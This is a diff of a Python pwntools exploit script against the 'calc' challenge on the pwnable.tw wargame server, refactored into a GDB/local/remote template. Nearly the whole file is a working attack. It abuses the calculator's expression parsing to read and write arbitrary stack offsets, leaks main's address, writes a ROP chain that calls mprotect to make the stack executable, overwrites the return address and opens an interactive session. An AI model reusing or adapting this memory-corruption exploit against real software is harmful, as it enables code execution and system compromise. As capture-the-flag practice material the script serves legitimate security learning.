@@ -1,16 +1,41 @@
 #!/usr/bin/env python3
 import pwn
 
+# Set up pwntools for the correct architecture
+exe = pwn.context.binary = pwn.ELF('../calc')
 
-pwn.context(arch='i386', kernel='i386', os='linux', endian='little', word_size=32, terminal=["tmux", "splitw", "-v"])
-remote = pwn.remote('chall.pwnable.tw', 10100)
-remote.recvuntil("=== Welcome to SECPROG calculator ===\n")
+# Run this python script inside tmux like this:
+# $> tmux
+# $> ./solution GDB
+# It will spawn a separate window with the GDB session
+pwn.context.terminal = ["tmux", "splitw", "-h"]
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+break mprotect
+continue
+'''.format(**locals())
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if pwn.args.GDB:
+        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif pwn.args.LOCAL:
+        return pwn.process([exe.path] + argv, *a, **kw)
+    else:
+        return pwn.remote('chall.pwnable.tw', 10100)
+
+
+io = start()
+io.recvuntil("=== Welcome to SECPROG calculator ===\n")
 
 
 def read_stack_offset(offset):
     assert offset > 0
-    remote.send(str(offset) + '+00\n')
-    signed = int(remote.recvuntil('\n'))
+    io.send(str(offset) + '+00\n')
+    signed = int(io.recvuntil('\n'))
     unsigned = signed % 2**32
     return unsigned
 
@@ -18,8 +43,8 @@ def read_stack_offset(offset):
 def write_stack_offset(offset, value):
     assert offset > 0
     assert value > 0
-    remote.send(str(offset) + '*' + '00%' + str(value) + '\n')
-    remote.recvline()
+    io.send(str(offset) + '*' + '00%' + str(value) + '\n')
+    io.recvline()
 
 main_ret_address_offset = 361
 
@@ -28,17 +53,15 @@ def get_stack_address_below_main():
     return read_stack_offset(esp_placed_at_offset) - \
            (esp_placed_at_offset + main_ret_address_offset)
 
-program = pwn.ELF("../calc")
 
 def search_for_main():
     for x in range(390, 405):
         value = read_stack_offset(x)
         print("Offset: %d. Value: 0x%08x" % (x, value))
-        if value == program.symbols['main']:
+        if value == exe.symbols['main']:
             print("FOUND MAIN AT %d" % x)
 
 
-#search_for_main()
 
 
 main_address = read_stack_offset(main_ret_address_offset)
@@ -56,7 +79,7 @@ def write_rop_chain_to_addr(addr, rop_chain):
 # Idea:
 
 
-mprotect_addr = program.symbols['mprotect']
+mprotect_addr = exe.symbols['mprotect']
 
 stack_addr = get_stack_address_below_main()
 stack_addr_at_pagesize = stack_addr % 4096
@@ -73,4 +96,4 @@ rop_chain += (
 
 write_rop_chain_to_addr(stack_addr+1, rop_chain)
 write_stack_offset(main_ret_address_offset, mprotect_addr)
-remote.interactive()
+io.interactive()
